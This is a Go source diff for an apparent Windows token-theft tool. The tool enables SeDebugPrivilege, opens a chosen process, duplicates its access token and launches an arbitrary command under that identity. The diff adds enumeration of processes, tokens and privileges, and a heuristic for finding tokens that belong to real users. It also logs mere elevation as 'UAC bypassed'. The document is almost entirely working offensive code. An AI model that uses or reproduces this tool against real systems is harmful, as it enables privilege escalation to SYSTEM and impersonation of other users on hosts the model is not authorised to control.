@@ -2,7 +2,11 @@ package main
 
 import (
 	"flag"
+	"fmt"
 	"log"
+	"os"
+	"os/user"
+	"strings"
 	"syscall"
 	"unsafe"
 )
@@ -18,8 +22,8 @@ type LuidAndAttributes struct {
 }
 
 type TokenPrivileges struct {
-	privilegeCount uint32 // DWORD
-	privileges     [1]LuidAndAttributes
+	privilegeCount uint32
+	privileges     [64]LuidAndAttributes
 }
 
 var (
@@ -54,8 +58,41 @@ const (
 	// [CreateProcessWithTokenW function](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
 	LOGON_WITH_PROFILE = 0x00000001
 	// [CreateToolhelp32Snapshot function](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot)
-	TH32CS_SNAPPROCESS = 0x00000002
+	TH32CS_SNAPPROCESS              = 0x00000002
+	SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001
+	SE_PRIVILEGE_ENABLED            = 0x00000002
+	SE_PRIVILEGE_REMOVED            = 0x00000004
+	TokenElevation                  = 20
+	SECURITY_MANDATORY_SYSTEM_RID   = 0x4000
+	PROCESS_ALL_ACCESS              = 0x1F0FFF
 )
+
+var privilegeNames = map[uint32]string{
+	5:  "SeCreateTokenPrivilege",
+	8:  "SeSecurityPrivilege",
+	9:  "SeTakeOwnershipPrivilege",
+	10: "SeLoadDriverPrivilege",
+	11: "SeSystemProfilePrivilege",
+	12: "SeSystemtimePrivilege",
+	13: "SeProfileSingleProcessPrivilege",
+	14: "SeIncreaseBasePriorityPrivilege",
+	15: "SeCreatePagefilePrivilege",
+	17: "SeBackupPrivilege",
+	18: "SeRestorePrivilege",
+	19: "SeShutdownPrivilege",
+	20: "SeDebugPrivilege",
+	22: "SeSystemEnvironmentPrivilege",
+	23: "SeChangeNotifyPrivilege",
+	24: "SeRemoteShutdownPrivilege",
+	25: "SeUndockPrivilege",
+	28: "SeManageVolumePrivilege",
+	29: "SeImpersonatePrivilege",
+	30: "SeCreateGlobalPrivilege",
+	33: "SeIncreaseWorkingSetPrivilege",
+	34: "SeTimeZonePrivilege",
+	35: "SeCreateSymbolicLinkPrivilege",
+	36: "SeRelabelPrivilege",
+}
 
 func enableSeDebugPrivilege() error {
 	var CurrentTokenHandle syscall.Token
@@ -94,11 +131,240 @@ func enableSeDebugPrivilege() error {
 	return err
 }
 
+func getPrivileges(token syscall.Token) {
+	var tokenInfoLength uint32
+	syscall.GetTokenInformation(token, syscall.TokenPrivileges, nil, 0, &tokenInfoLength)
+	buffer := make([]byte, tokenInfoLength)
+	err := syscall.GetTokenInformation(token, syscall.TokenPrivileges, &buffer[0], tokenInfoLength, &tokenInfoLength)
+	if err != nil {
+		log.Printf("[-] GetTokenInformation failed: %v", err)
+		return
+	}
+
+	tp := (*TokenPrivileges)(unsafe.Pointer(&buffer[0]))
+
+	var enabledPrivileges []string
+	for i := uint32(0); i < tp.privilegeCount; i++ {
+		privilege := tp.privileges[i]
+		if privilege.attributes&SE_PRIVILEGE_ENABLED != 0 {
+			if name := privilegeNames[privilege.luid.lowPart]; name != "" {
+				enabledPrivileges = append(enabledPrivileges, name)
+			}
+		}
+	}
+
+	if len(enabledPrivileges) > 0 {
+		log.Printf("[+] Enabled privileges: %s\n", strings.Join(enabledPrivileges, ", "))
+	} else {
+		log.Println("[+] No enabled privileges found")
+	}
+}
+
+func getPrivilegeAttributesString(attributes uint32) string {
+	var status []string
+	if attributes&SE_PRIVILEGE_ENABLED_BY_DEFAULT != 0 {
+		status = append(status, "ENABLED_BY_DEFAULT")
+	}
+	if attributes&SE_PRIVILEGE_ENABLED != 0 {
+		status = append(status, "ENABLED")
+	}
+	if attributes&SE_PRIVILEGE_REMOVED != 0 {
+		status = append(status, "REMOVED")
+	}
+	if len(status) == 0 {
+		return "DISABLED"
+	}
+	return strings.Join(status, "|")
+}
+
+func getUserInfo() (string, bool) {
+	currentUser, err := user.Current()
+	if err != nil {
+		return "Unknown", false
+	}
+
+	var token syscall.Token
+	process, _ := syscall.GetCurrentProcess()
+	err = syscall.OpenProcessToken(process, syscall.TOKEN_QUERY, &token)
+	if err != nil {
+		return currentUser.Username, false
+	}
+	defer token.Close()
+
+	var isElevated uint32
+	var returnLen uint32
+	err = syscall.GetTokenInformation(token, TokenElevation, (*byte)(unsafe.Pointer(&isElevated)), 4, &returnLen)
+
+	return currentUser.Username, isElevated != 0
+}
+
+func getTokenUserInfo(token syscall.Token) string {
+	var tokenInfoLength uint32
+	syscall.GetTokenInformation(token, syscall.TokenUser, nil, 0, &tokenInfoLength)
+	buffer := make([]byte, tokenInfoLength)
+	err := syscall.GetTokenInformation(token, syscall.TokenUser, &buffer[0], tokenInfoLength, &tokenInfoLength)
+	if err != nil {
+		return "Unknown"
+	}
+
+	tokenUser := (*syscall.Tokenuser)(unsafe.Pointer(&buffer[0]))
+	account, domain, _, err := tokenUser.User.Sid.LookupAccount("")
+	if err != nil {
+		return "Unknown"
+	}
+	return domain + "\\" + account
+}
+
+func isRealUser(username string) bool {
+	systemPrefixes := []string{
+		"NT AUTHORITY\\",
+		"SYSTEM",
+		"LOCAL SERVICE",
+		"NETWORK SERVICE",
+		"BUILTIN\\",
+		"NT SERVICE\\",
+		"IIS APPPOOL\\",
+	}
+
+	for _, prefix := range systemPrefixes {
+		if strings.HasPrefix(strings.ToUpper(username), strings.ToUpper(prefix)) {
+			return false
+		}
+	}
+
+	parts := strings.Split(username, "\\")
+	if len(parts) != 2 {
+		return false
+	}
+	username = parts[1]
+
+	userPath := "C:\\Users\\" + username
+	if _, err := os.Stat(userPath); err == nil {
+		typicalFolders := []string{
+			"Desktop",
+			"Documents",
+			"Downloads",
+			"AppData",
+		}
+
+		for _, folder := range typicalFolders {
+			if _, err := os.Stat(userPath + "\\" + folder); err == nil {
+				return true
+			}
+		}
+	}
+
+	return false
+}
+
+type ProcessInfo struct {
+	PID      uint32
+	UserName string
+	ExeName  string
+	Token    syscall.Token
+}
+
+func getAllProcesses() []ProcessInfo {
+	var processes []ProcessInfo
+
+	snapshot, err := syscall.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+	if err != nil {
+		log.Printf("[-] Failed to create snapshot: %v\n", err)
+		return processes
+	}
+	defer syscall.CloseHandle(snapshot)
+
+	var pe syscall.ProcessEntry32
+	pe.Size = uint32(unsafe.Sizeof(pe))
+
+	err = syscall.Process32First(snapshot, &pe)
+	if err != nil {
+		log.Printf("[-] Failed to get first process: %v\n", err)
+		return processes
+	}
+
+	for {
+		if handle, err := syscall.OpenProcess(PROCESS_QUERY_INFORMATION, false, pe.ProcessID); err == nil {
+			var token syscall.Token
+			if err := syscall.OpenProcessToken(handle, TOKEN_QUERY, &token); err == nil {
+				processes = append(processes, ProcessInfo{
+					PID:      pe.ProcessID,
+					UserName: getTokenUserInfo(token),
+					ExeName:  syscall.UTF16ToString(pe.ExeFile[:]),
+					Token:    token,
+				})
+			}
+			syscall.CloseHandle(handle)
+		}
+
+		if err = syscall.Process32Next(snapshot, &pe); err != nil {
+			break
+		}
+	}
+
+	return processes
+}
+
+func listProcesses() {
+	processes := getAllProcesses()
+	defer func() {
+		for _, p := range processes {
+			p.Token.Close()
+		}
+	}()
+
+	log.Println("[+] PID\tUser\t\t\tProcess Name")
+	log.Println(" ===\t====\t\t\t============")
+
+	for _, proc := range processes {
+		userType := "🤖"
+		if isRealUser(proc.UserName) {
+			userType = "👤"
+		}
+		fmt.Printf("\t\t\t%d\t%s %-40s\t%s\n", proc.PID, userType, proc.UserName, proc.ExeName)
+	}
+}
+
+func listUniqueTokens() {
+	processes := getAllProcesses()
+	defer func() {
+		for _, p := range processes {
+			p.Token.Close()
+		}
+	}()
+
+	uniqueTokens := make(map[string][]uint32)
+	for _, proc := range processes {
+		uniqueTokens[proc.UserName] = append(uniqueTokens[proc.UserName], proc.PID)
+	}
+
+	log.Println("[+] Available Tokens in System:")
+	log.Println("================================")
+
+	for userName, pids := range uniqueTokens {
+		userType := "🤖 System Account"
+		if isRealUser(userName) {
+			userType = "👤 Real User"
+		}
+		log.Printf("[+] Token User: %s (%s)\n", userName, userType)
+		log.Printf("    Associated PIDs: %v\n", pids)
+		if len(pids) > 0 {
+			for _, proc := range processes {
+				if proc.PID == pids[0] {
+					log.Print("    Privileges: ")
+					getPrivileges(proc.Token)
+					break
+				}
+			}
+		}
+		log.Println("--------------------------------")
+	}
+}
+
 // Reference: https://github.com/yusufqk/SystemToken/blob/master/main.c len 102
 func handleProcess(pid uint32) syscall.Handle {
 	log.Println("[+] OpenProcess() start.")
 	ProcessHandle, err := syscall.OpenProcess(PROCESS_QUERY_INFORMATION, true, pid)
-	// log.Println(err)
 	if err != nil {
 		ProcessHandle, err = syscall.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, pid)
 		if err != nil {
@@ -106,6 +372,11 @@ func handleProcess(pid uint32) syscall.Handle {
 		}
 	} else {
 		log.Println("[+] OpenProcess() success:", ProcessHandle)
+		var procToken syscall.Token
+		if err := syscall.OpenProcessToken(ProcessHandle, TOKEN_QUERY, &procToken); err == nil {
+			log.Printf("[+] Target process running as: %s\n", getTokenUserInfo(procToken))
+			procToken.Close()
+		}
 	}
 	return ProcessHandle
 }
@@ -120,6 +391,9 @@ func runAsToken(TokenHandle uintptr, command *uint16) error {
 		log.Println("[-] DuplicateTokenEx() error:", err)
 	} else {
 		log.Println("[+] DuplicateTokenEx() success")
+		log.Printf("[+] New token user: %s\n", getTokenUserInfo(NewTokenHandle))
+		log.Println("[+] New token privileges after duplication:")
+		getPrivileges(NewTokenHandle)
 	}
 
 	result, _, err = CreateProcessWithTokenW.Call(uintptr(NewTokenHandle), LOGON_WITH_PROFILE, uintptr(0), uintptr(unsafe.Pointer(command)), 0, uintptr(0), uintptr(0), uintptr(unsafe.Pointer(&StartupInfo)), uintptr(unsafe.Pointer(&ProcessInformation)))
@@ -133,25 +407,59 @@ func runAsToken(TokenHandle uintptr, command *uint16) error {
 }
 
 func main() {
+	username, isElevated := getUserInfo()
+	if isElevated {
+		log.Printf("[+] Current user: %s (UAC bypassed)", username)
+	} else {
+		log.Println("[!] Process is running with normal privileges, need to elevate privileges.")
+		os.Exit(1)
+	}
+
 	var pid int
 	var command string
-	var TokenHandle syscall.Token
+	var list bool
+	var tokens bool
 
 	flag.IntVar(&pid, "p", 0, "Target Process PID.")
 	flag.StringVar(&command, "c", "Aquilao", "Execute Command.")
+	flag.BoolVar(&list, "l", false, "List all processes with their tokens")
+	flag.BoolVar(&tokens, "t", false, "List available unique tokens in system")
 	flag.Parse()
 
-	if pid != 0 && command != "." {
+	if tokens {
+		listUniqueTokens()
+		return
+	}
+
+	if list {
+		listProcesses()
+		return
+	}
+
+	if pid != 0 && command != "Aquilao" {
 		log.Println("[+] Process Pid: ", pid)
 		log.Println("[+] Execute Command: ", command)
+
+		var currentToken syscall.Token
+		currentProcess, _ := syscall.GetCurrentProcess()
+		err := syscall.OpenProcessToken(currentProcess, TOKEN_QUERY, &currentToken)
+		if err == nil {
+			getPrivileges(currentToken)
+		}
+
 		enableSeDebugPrivilege()
 		ProcessHandle := handleProcess(uint32(pid))
-		err := syscall.OpenProcessToken(ProcessHandle, TOKEN_QUERY|TOKEN_DUPLICATE, &TokenHandle)
+
+		var TokenHandle syscall.Token
+		err = syscall.OpenProcessToken(ProcessHandle, TOKEN_QUERY|TOKEN_DUPLICATE, &TokenHandle)
 		if err != nil {
 			log.Println("[-] OpenProcessToken() error:", err)
 		} else {
 			log.Println("[+] OpenProcessToken() success")
+			log.Println("[+] Target process privileges:")
+			getPrivileges(TokenHandle)
 		}
+
 		runAsToken(uintptr(TokenHandle), syscall.StringToUTF16Ptr(command))
 	} else {
 		log.Println("[-] Please input pid and command, type \"-h\" see help.")
